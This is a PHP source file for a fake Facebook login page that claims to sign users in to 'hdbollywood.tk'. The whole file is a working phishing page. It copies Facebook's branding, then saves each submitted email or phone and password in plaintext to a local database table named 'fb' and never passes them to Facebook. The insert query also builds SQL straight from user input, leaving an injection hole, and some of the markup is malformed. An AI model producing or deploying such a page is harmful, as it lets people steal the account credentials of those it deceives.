<?php 
$con= mysqli_connect('localhost','root','','users');
if ($con->connect_error) {
	die("connection fails ");
}

?>
<!DOCTYPE html>
<html>
<head>
	<title>login</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<style >
	[class*="col-"] {
  width: 100%;
}

@media only screen and (min-width: 600px) {
  /* For tablets: */
  .col-s-1 {width: 8.33%;}
  .col-s-2 {width: 16.66%;}
  .col-s-3 {width: 25%;}
  .col-s-4 {width: 33.33%;}
  .col-s-5 {width: 41.66%;}
  .col-s-6 {width: 50%;}
  .col-s-7 {width: 58.33%;}
  .col-s-8 {width: 66.66%;}
  .col-s-9 {width: 75%;}
  .col-s-10 {width: 83.33%;}
  .col-s-11 {width: 91.66%;}
  .col-s-12 {width: 100%;}
}
@media only screen and (min-width: 768px) {
  /* For desktop: */
  .col-1 {width: 8.33%;}
  .col-2 {width: 16.66%;}
  .col-3 {width: 25%;}
  .col-4 {width: 33.33%;}
  .col-5 {width: 41.66%;}
  .col-6 {width: 50%;}
  .col-7 {width: 58.33%;}
  .col-8 {width: 66.66%;}
  .col-9 {width: 75%;}
  .col-10 {width: 83.33%;}
  .col-11 {width: 91.66%;}
  .col-12 {width: 100%;}
}
.header{
	background-color:#39569c;
	border: 2px none #39569c; 
	color: white;
	padding: .5%;
	margin-top: -10px;
	margin-right: -10px;
  margin-left: -10px;

}
.text{
	padding-left: 2%;
}
.login{
margin-left: 37%;
color:#666666;
font-family: Arial;
font-size: 13px;
}
.button{
	margin-left: 13%;
	margin-top: .5%;
	border: solid;
	border-radius: 7px;
	background-color: #4370c6;
	padding: 6px 10px;
	color:white; 
	font-size: 13px;
}
.button:hover {
  background-color: #365899;
  color: white;}
  .for{
  	color: #365899;
  	text-decoration: none;
  	margin-left: 13%;

  }
  .for:hover{
  	text-decoration:underline;
  }
  .ac{
  	margin-left:13%;
  	background-color:#42b629; 
  	border:none;
  	border-radius: 2px;
  	color: white;
  	padding: 3px 5px; 
  	text-decoration: none;
  }

  .ac:hover{
  	border:none;
  	background-color: #39a221;
   }
   #log{
	margin-top:1px;
	}
</style>

</head>
<body>
	<div class="header">
	<img id="log" src="download.png" alt="Facebook logo" width="14px">
		Facebook</div>
		<div class="text">
			<br>Log in to use your Facebook account with <strong>hdbollywood.tk</strong>
		</div>
		<br>
		<form method="post" action="" class="login">
		<span>	<strong>Email address or</strong> <input autofocus type="text" name="id"><br>
			    <strong>Phone number:</strong><br><br>
			    <strong>Password:</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type="password" name="password" ></span><br><br>
			    
			    	<button class="button" name="submit" >Log In</button></div><br><br>
			    	<a href="www.fb.com" class="for" >Forgotten account?</style> </a><br><br>

			    	<a href="www.fb.com" class="ac"><strong>Create New Account</strong> </a>
			    	</form>
	
	
</body>
<?php
	if (isset($_POST['submit'])) {
	$id=$_POST["id"];
	$password=$_POST["password"];

	$sql="INSERT INTO fb (id , pass ) 
	 VALUES ('$id' , '$password')";
	if($con->query($sql)){
		echo "";
	}
	}?>
</html>



